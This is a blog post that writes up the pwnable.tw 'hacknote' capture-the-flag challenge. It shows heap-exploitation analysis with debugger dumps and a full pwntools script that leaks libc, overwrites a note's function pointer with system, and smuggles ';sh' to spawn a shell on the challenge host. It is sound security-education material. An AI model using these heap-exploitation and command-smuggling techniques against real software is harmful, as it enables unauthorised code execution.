---
layout: post
title:  "Pwnable.tw - hacknote"
date:   2024-12-30 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## hacknote

```bash
$ checksec ./hacknote
[*] '/home/itay/projects/pwnable_tw/hacknote/hacknote'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)

$ file ./hacknote
./hacknote: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a32de99816727a2ffa1fe5f4a324238b2d59a606, stripped
```

### Overview

This is a classic menu-based challenge. There are 4 options: `add_note, delete_note, print_note, exit`. \
There are few sus notes:

1. Within the `add_note` handler, there seems to be a global counter that tracks the amount of allocated notes. The array only contains `5` slots, and an empty slot is denoted by a `NULL`. This array is being traversed, until non-nullptr is found, which is served as the note pointer slot.

2. The note object store 2 members: extremely sus function pointer, and a pointer to the note's content.

3. The note's content buffer size is completely controlled by us. It can be very large value, as well as `0`. Moreover, there seems to be no checks at all regarding the allocated buffer's size. 

4. Vuln - the buffer is being allocated with `malloc(size)`, without any initialization. Hence, theres a UDA, potentially leaking bytes that remained on the heap.

5. Also regarding the input buffer - notice we read exactly `size` bytes into the buffer. It means we can make the input buffer to be untruncated. In particular, for 32-bit allocations with nibble `0x8`, such as `0x28`, the chunks are being allocated consequitively to their next chunk's metadata. This may serve us within a leak primitive. 

6. Within `delete_note`, there are proper checks regarding the `index` value. However, notice that upon a deletion, the note's buffer is being `free`d first, then the note object (as it should be). However, after non of the `free` calls, the previous containing address wasn't set back to `NULL`, hence - leaving dangling heap pointers on both the heap (due to the note's content) and the .bss (due to the note's object). 

7. A logical vuln within `delete_note`, is the fact that it doesn't decrements the global notes counter. 

8. Because of `delete_note` UAF, we can actually do double-free. In parciular, we'd like to perform `free(A); free(B); free(A)` pattern, to bypass freelist head mitigation.

9. The `print_note` handler also contains a sane sanity check regarding `index`. However, the way it actually print the note is completely wrecked - it fetches the function pointer off the note object (`*(note + 0)`), and prints the inner buffer (`*(note + 4)`). Of course, we can use it to easily leak heap pointers. 

### Debug

We're given the exact libc-32 as we had within previous challenges, such as `dubblesort`. \
I've found a corresponding `ld.so` version using `glibc-all-in-one`, and run `patch_binary.sh`:

```bash
#!/bin/sh

BINARY="./hacknote"
cp $BINARY "${BINARY}.bk"
patchelf --set-interpreter ./ld-2.23.so $BINARY
patchelf --replace-needed libc.so.6 ./libc_32.so.6 $BINARY
```

### Exploitation

Eventually, I'd like to read `system("/bin/sh")`. 
The function pointer overwrite is an exact candidate, as it also receives a single argument - which is a string we control. \
In order to overwrite a note's `fp`, we have to make sure the note is first freed, and our newly-allocated buffer falls exactly within the note's start. 

### Read Primitive 

We got exact libc version for SOME reason, so we'd probably like to jump there eventually. Hence, libc leak is a must. \
Moreover, heap pointers might be needed during our exploitation, so we'd aim for those too. 

My idea is simple - enter chunks of size having nibble `0x8`, and play with the heap, such that the chunk's metdata would be populated. \
The following is an example layout of 3 allocated notes, each of size `0x8` of content:

```bash
pwndbg> x/40wx 0x0961b008 - 0x8
0x961b000:      0x00000000      0x00000011      0x0804862b      0x0961b018
0x961b010:      0x00000000      0x00000011      0x41414141      0x41414141
0x961b020:      0x00000000      0x00000011      0x0804862b      0x0961b038
0x961b030:      0x00000000      0x00000011      0x41414141      0x41414141
0x961b040:      0x00000000      0x00000011      0x0804862b      0x0961b058
0x961b050:      0x00000000      0x00000011      0x41414141      0x41414141
0x961b060:      0x00000000      0x00020fa1      0x00000000      0x00000000
```

By using the trick of adding nibble `0x4`, meaning to allocate `0xc` chunks, 
we can also populate the `PREV_SIZE` field (the first note in the example is freed):

```bash
pwndbg> x/40wx $eax-0x8
0x97b5000:      0x00000000      0x00000011      0x097b5010      0x097b5018
0x97b5010:      0x00000000      0x00000011      0x00000000      0x41414141
0x97b5020:      0x41414141      0x00000011      0x0804862b      0x097b5038
0x97b5030:      0x00000000      0x00000011      0x41414141      0x41414141
0x97b5040:      0x41414141      0x00000011      0x0804862b      0x097b5058
0x97b5050:      0x00000000      0x00000011      0x41414141      0x41414141
0x97b5060:      0x41414141      0x00020fa1      0x00000000      0x00000000
```

In order to do some interesting stuff (overwrite chunk's control plane within its data plaen), 
we must find a way to consolidate the fastbins. \
Recall the fastbins usually aren't consolidated. There are some very interesting edge cases where they are, though. 
I've wrote a small paragraph about this case a while ago: [fastbin-consolidation][fastbin-consolidation]. \
We can mark fastbin chunks as "Being consolidation candidates" (clearing their `P` bit) by either making a large allocation,
corresponding to the largebins smallest size, or extremely large free of a chunk. \
By allocating 2 notes, and freeing the first of them, the following layout occurs:

```bash
pwndbg> vis

0x84f3000       0x00000000      0x00000011      ........         <-- fastbins[0x10][0]
0x84f3008       0x00000000      0x084f3018      .....0O.
0x84f3010       0x00000000      0x00000051      ....Q...         <-- unsortedbin[all][0]
0x84f3018       0xec1aa7b0      0xec1aa7b0      ........
0x84f3020       0x41414141      0x41414141      AAAAAAAA
0x84f3028       0x41414141      0x41414141      AAAAAAAA
0x84f3030       0x41414141      0x41414141      AAAAAAAA
0x84f3038       0x41414141      0x41414141      AAAAAAAA
0x84f3040       0x41414141      0x41414141      AAAAAAAA
0x84f3048       0x41414141      0x41414141      AAAAAAAA
0x84f3050       0x41414141      0x41414141      AAAAAAAA
0x84f3058       0x41414141      0x41414141      AAAAAAAA
0x84f3060       0x00000050      0x00000010      P.......
0x84f3068       0x0804862b      0x084f3078      +...x0O.
0x84f3070       0x00000000      0x00000051      ....Q...
0x84f3078       0x41414141      0x41414141      AAAAAAAA
0x84f3080       0x41414141      0x41414141      AAAAAAAA
0x84f3088       0x41414141      0x41414141      AAAAAAAA
0x84f3090       0x41414141      0x41414141      AAAAAAAA
0x84f3098       0x41414141      0x41414141      AAAAAAAA
0x84f30a0       0x41414141      0x41414141      AAAAAAAA
0x84f30a8       0x41414141      0x41414141      AAAAAAAA
0x84f30b0       0x41414141      0x41414141      AAAAAAAA
0x84f30b8       0x41414141      0x41414141      AAAAAAAA
0x84f30c0       0x41414141      0x00020f41      AAAAA...         <-- Top chunk
```

However, after freeing the chunk that starts within `0x84f3070` (which is part of `fastbins[0x50]`), 
the following amazing layout have produced:

```bash
pwndbg> vis

0x84f3000       0x00000000      0x00000061      ....a...         <-- unsortedbin[all][0]
0x84f3008       0xec1aa7b0      0xec1aa7b0      ........
0x84f3010       0x00000000      0x00000051      ....Q...
0x84f3018       0xec1aa7b0      0xec1aa7b0      ........
0x84f3020       0x41414141      0x41414141      AAAAAAAA
0x84f3028       0x41414141      0x41414141      AAAAAAAA
0x84f3030       0x41414141      0x41414141      AAAAAAAA
0x84f3038       0x41414141      0x41414141      AAAAAAAA
0x84f3040       0x41414141      0x41414141      AAAAAAAA
0x84f3048       0x41414141      0x41414141      AAAAAAAA
0x84f3050       0x41414141      0x41414141      AAAAAAAA
0x84f3058       0x41414141      0x41414141      AAAAAAAA
0x84f3060       0x00000060      0x00000010      `.......
0x84f3068       0x0804862b      0x084f3078      +...x0O.
0x84f3070       0x00000000      0x00020f91      ........         <-- Top chunk
```

Meaning, our freed `0x84f3070` chunk was consolidated to the top chunk, which then was treated as a very large chunk to-be-freed,
and **triggered fastbins consolidation**! As we can see, our `freelist[0x10]` first chunk was merged to the unsortedbin! \
Right after the second chunk's `data` is freed, its metadata is also freed, producing the following layout:

```bash
pwndbg> vis

0x84f3000       0x00000000      0x00000061      ....a...         <-- unsortedbin[all][0]
0x84f3008       0xec1aa7b0      0xec1aa7b0      ........
0x84f3010       0x00000000      0x00000051      ....Q...
0x84f3018       0xec1aa7b0      0xec1aa7b0      ........
0x84f3020       0x41414141      0x41414141      AAAAAAAA
0x84f3028       0x41414141      0x41414141      AAAAAAAA
0x84f3030       0x41414141      0x41414141      AAAAAAAA
0x84f3038       0x41414141      0x41414141      AAAAAAAA
0x84f3040       0x41414141      0x41414141      AAAAAAAA
0x84f3048       0x41414141      0x41414141      AAAAAAAA
0x84f3050       0x41414141      0x41414141      AAAAAAAA
0x84f3058       0x41414141      0x41414141      AAAAAAAA
0x84f3060       0x00000060      0x00000010      `.......         <-- fastbins[0x10][0]
0x84f3068       0x00000000      0x084f3078      ....x0O.
0x84f3070       0x00000000      0x00020f91      ........         <-- Top chunk
```

Recall what wer'e trying to achieve: overwrite the metadata of some chunk, with other chunk's data. 
In the above example, we're pretty close - both chunks are freed, while the second note's medata starts at `0x84f3060`. \
All we have to do, is to consolidate them once again.
This can be easily achieved by performing another allocation, where its consolidation with the top chunk would trigger 
chunk-2's fastbin being consolidated with the unsortedbin. \
Keep in mind that we're very limited, as wer'e having up to 5 allocations. \
Hence, the following allocations order would produce our desired heap layout:

```bash
1 = add_note()
2 = add_note()
3 = add_note()
delete(1)
delete(2)
delete(3)  # Now note(3) data is being consolidated with the top chunk, trigerring major consolidation that includes the fastbins - which makes 1+2 merge
4 = add_note()  # Now there should be no more free chunks. occupied chunk-3's metadata, and the merged 1+2 as its data
```

The resulting layout:

```bash
pwndbg> vis                                                                                                                  [13/297]
0x96cd000       0x00000000      0x000000c1      ........
0x96cd008       0xf19817b0      0xf19817b0      ........
0x96cd010       0x00000000      0x000000b1      ........
0x96cd018       0xf19817b0      0xf19817b0      ........
0x96cd020       0x41414141      0x41414141      AAAAAAAA
0x96cd028       0x41414141      0x41414141      AAAAAAAA
0x96cd030       0x41414141      0x41414141      AAAAAAAA
0x96cd038       0x41414141      0x41414141      AAAAAAAA
0x96cd040       0x41414141      0x41414141      AAAAAAAA
0x96cd048       0x41414141      0x41414141      AAAAAAAA
0x96cd050       0x41414141      0x41414141      AAAAAAAA
0x96cd058       0x41414141      0x41414141      AAAAAAAA
0x96cd060       0x00000050      0x00000010      P.......
0x96cd068       0x096cd000      0x096cd078      ..l.x.l.
0x96cd070       0x00000000      0x00000051      ....Q...
0x96cd078       0xf19817b0      0xf19817b0      ........
0x96cd080       0x41414141      0x41414141      AAAAAAAA
0x96cd088       0x41414141      0x41414141      AAAAAAAA
0x96cd090       0x41414141      0x41414141      AAAAAAAA
0x96cd098       0x41414141      0x41414141      AAAAAAAA
0x96cd0a0       0x41414141      0x41414141      AAAAAAAA
0x96cd0a8       0x41414141      0x41414141      AAAAAAAA
0x96cd0b0       0x41414141      0x41414141      AAAAAAAA
0x96cd0b8       0x41414141      0x41414141      AAAAAAAA
0x96cd0c0       0x000000c0      0x00000011      ........
0x96cd0c8       0x0804862b      0x096cd008      +.....l.
0x96cd0d0       0x00000000      0x00020f31      ....1...         <-- Top chunk
```

Notice that note-4's data chunk starts at `0x96cd000`, and its controlled user input at `0x96cd008`. 
Indeed, its size corresponds to `0xc = 2 * (0x10 + 0x50)`, as the 2 first notes were merged properly. \
Hence, by filling `0x10` bytes, and trigerring `print`, we can obtain libc leakage. \
Notice - this glibc version supports fastbins for up to `0x40` size class. I've chose to allocate chunks of size `0x4c`,
as they won't reside with the fastbins, hence - contain `fd, bk` metadata pointers, pointing to their corresponding slot
within the `main_arena` - which is a libc symbol! `0xf19817b0` is the leak in our example. 

### Write Primitive 

Now that we have leaks, and our heap is properly shaped, all we have to do is to free the 4'th note, 
and allocate a new note with the exact same size. We can just overwrite one of the other note's `fp` to `system`, 
and we get code execution. I've chose to overwrite note-1's metadata. \
Notice we can also control the preceding bytes of the note we overwrite. 

### RCE

Now that we've written the `fp`, we get code execution by triggering the `print` handler of that note. \
However, notice how exactly the print handler works - it actually dispatches as follows: `note->fp(note)`. 
Hence, while we call `system`, its argument won't be a legitimate pointer to string, but to our fake note object. \
It could be nice, however - the first 4 bytes of the fake note object are the `fp` bytes! 

I tought of 2 possible ways to overcome this:

1. (bad, yet extremely cool) - do nothing. What happens in this case, is that `system("1\n")` is being called, which seems to be dangling string pointer we've entered during picking the `print` handler option. Because that handler parses this number via `atoi` (which is a dangerous function as it doesn't checks for parsing errors), I've entered malicious string instead - `atoi("1;sh")`, which **got properly parsed as `1`!!** Moreover, it did execute the secondary `sh`, however because there were non-null bytes past it (randomized bytes), they were also parsed as invalid command, making this to work at extremely low odds.

2. (good, and also cool) - Right after writing `system` address, write the raw bytes `;sh\x00` or `;sh;`. This would guranteed that while `sh` won't be able to interpret the address of `fp` as a command, the inner `sh` would get executed as expected, as it is parsed as follows: `sh -c '\xff\fe\xfc\x40;sh\x00'`. 

### Solution

```python
#!/usr/bin/python3

from pwn import *

HOST = 'chall.pwnable.tw'
PORT = 10102
context.arch='i386'
BINARY = './hacknote'
LIBC = './libc_32.so.6'
LD = './ld-2.23.so'

GDB_SCRIPT = '''
# b *0x804891f
# commands
#    p "notes:"
#    x/20wx 0x804a050

# end

b *0x80488d1
command
   p "Calling read.."
end


# b *0x8048923
# command
#    p "Calling fp.."
# end

c
'''

def unsigned(n, bitness=32):
    if n < 0:
        n = n + 2**bitness
    return n

def pad(buf, alignment, delimiter=b'\x00'):
    if (len(buf) % alignment) == 0:
        return buf

    extra = (alignment - (len(buf) % alignment)) * delimiter
    return buf + extra

def splitted(buf, n):
    for i in range(0, len(buf), n):
        yield buf[i: i + n]

def chunkSize(alloc_size):
    assert(alloc_size >= 0)
    min_size = alloc_size + SIZEOF_PTR
    res = min_size % (2 * SIZEOF_PTR)
    pad = (2 * SIZEOF_PTR) - res if res else 0
    return min_size + pad

def allocSize(chunkSize):
    assert((chunkSize & 0xf) == 0)
    return chunkSize - SIZEOF_PTR

def recvPointer(p):
    leak = p.recv(SIZEOF_PTR)
    assert(len(leak) == SIZEOF_PTR)
    leak = u32(leak)
    return leak

###### Constants ######
IS_DEBUG = False
IS_REMOTE = True
SIZEOF_PTR = 4
NOTE_SIZE = 0x8
# Smallest chunk that is guranteed to be not part of the fastbins, having max size of 0x40.
# Hence, allows main_arena libc leakage
DATA_SIZE = 0x4c  
CONSOLIDATED_CHUNK_SIZE = 2 * (chunkSize(NOTE_SIZE) + chunkSize(DATA_SIZE))
CONSOLIDATED_ALLOC_SIZE = allocSize(CONSOLIDATED_CHUNK_SIZE)

###### Offsets ######
MAIN_ARENA_TO_LIBC_BASE = 0x1b07b0

###### Addresses ######
libc = ELF(LIBC)
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']
log.info(f'bin_sh: {hex(bin_sh)}')
log.info(f'system: {hex(system)}')

libc_rop = ROP(LIBC)
pop_eax_ret = libc_rop.eax.address
pop_ebx_ret = libc_rop.ebx.address
pop_ecx_ret = libc_rop.ecx.address
pop_edx_ret = libc_rop.edx.address
leave_ret = libc_rop.find_gadget(['leave']).address
int_80 = libc_rop.find_gadget(['int 0x80']).address
log.info(f'pop_eax_ret: {hex(pop_eax_ret)}')
log.info(f'pop_ebx_ret: {hex(pop_ebx_ret)}')
log.info(f'pop_ecx_ret: {hex(pop_ecx_ret)}')
log.info(f'pop_edx_ret: {hex(pop_edx_ret)}')
log.info(f'leave_ret: {hex(leave_ret)}')
log.info(f'int_80: {hex(int_80)}')

###### Exploit ######
def addNote(p, size, data):
    assert(len(data) <= size)
    p.recvuntil(b'Your choice :')
    p.sendline(b'1')
    p.recvuntil(b'Note size :')
    p.sendline(str(size).encode())
    p.recvuntil(b'Content :')
    p.send(data)
    p.recvuntil(b'Success !')

def printNote(p, index):
    assert((index < 5) and (index >= 0))
    p.recvuntil(b'Your choice :')
    p.sendline(b'3')
    p.recvuntil(b'Index :')
    p.sendline(str(index).encode())

def deleteNote(p, index):
    assert((index < 5) and (index >= 0))
    p.recvuntil(b'Your choice :')
    p.sendline(b'2')
    p.recvuntil(b'Index :')
    p.sendline(str(index).encode())

def shapeHeap(p):
    ''' By the end of this function, there's a single, large, consolidated chunk at the beginning 
    of the heap, stored as the only unsortedbin chunk.
    There's also a free fastbin[0x10] at the end of the heap. 
    '''
    buf = b'A' * DATA_SIZE 
    addNote(p, len(buf), buf)
    addNote(p, len(buf), buf)
    addNote(p, len(buf), buf)
    deleteNote(p, 0)
    deleteNote(p, 1)
    deleteNote(p, 2)
    log.info('Heap shaped!')

def leakLibc(p):
    # Allocate large buffer at our consolidated chunk.
    # Fill null bytes up to the libc leakage
    buf = b'B' * SIZEOF_PTR * 4
    addNote(p, CONSOLIDATED_ALLOC_SIZE, buf)
    # Print non-null bytes, now including libc leak
    printNote(p, 3)
    p.recvuntil(buf)
    libc_leak = recvPointer(p)
    libc_base = libc_leak - MAIN_ARENA_TO_LIBC_BASE
    log.info(f'libc_leak: {hex(libc_leak)} libc_base: {hex(libc_base)}')
    assert((libc_base & 0xfff) == 0)
    return libc_base

def exploit(p):
    shapeHeap(p)
    libc_base = leakLibc(p)
    libc_bin_sh = libc_base + bin_sh
    libc_system = libc_base + system

    # Now that we have addresses, overwrite notes[1]
    deleteNote(p, 3)  
    buf = b'C' * (chunkSize(NOTE_SIZE) + chunkSize(DATA_SIZE))
    buf += p32(libc_system)
    # This part is very tricky - while we're corrupting system address succesfully,
    # it is being called as system(note[1]), where note[1] is actually pointer to note, 
    # hence - starts with 4 bytes of fp (libc_system address), and only then - the expected command. 
    # In order to handle this, I've truncated the parsed command, such that 'sh' would be executed properly :)
    buf += b';sh\x00'
    addNote(p, CONSOLIDATED_ALLOC_SIZE, buf)

    # Trigger system("\xblabla;sh")
    printNote(p, 1)
    # Possible atoi("1;sh") trick! It is actually being parsed as 1. 
    # Works at extremely low statistics. 
    # p.recvuntil(b'Your choice :')
    # p.sendline(b'3')
    # p.recvuntil(b'Index :')
    # p.send(b'1;sh')

def main():
    if IS_DEBUG:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        if IS_REMOTE:
            p = remote(HOST, PORT)
        else:
            p = process(BINARY)

    exploit(p)

    log.info('Win')
    p.interactive()

if __name__ == '__main__':
    main()
```

In conclusion, I'd say there are few cool lessons I've learned from this challenge:

1. Fastbin consolidation is possible, and can happen not only on trivial large `malloc` and very large `free`s, but also via consolidation to `top_chunk` (as it is equivalent to very large `free`).

2. In general, heap shaping is a critical skill for exploitation. It may require deep understanding of the allocator's edge cases though.

3. In continuation for the above, the fact that we can pop `libc` pointers within the heap isn't trivial. 

4. `atoi` is extremely dangerous function - parsing `"1;sh"` as a legitimate number without any indicative error isn't good design decision. 

5. Bypassing interpreters using `;sh;` is always good. Even if the preceding content is corrupted, most interpreters would handle this.

[fastbin-consolidation]: https://itaysnir.github.io/jekyll/update/2024/05/22/pwncollege-beyond-tcache.html#fastbin-consolidation
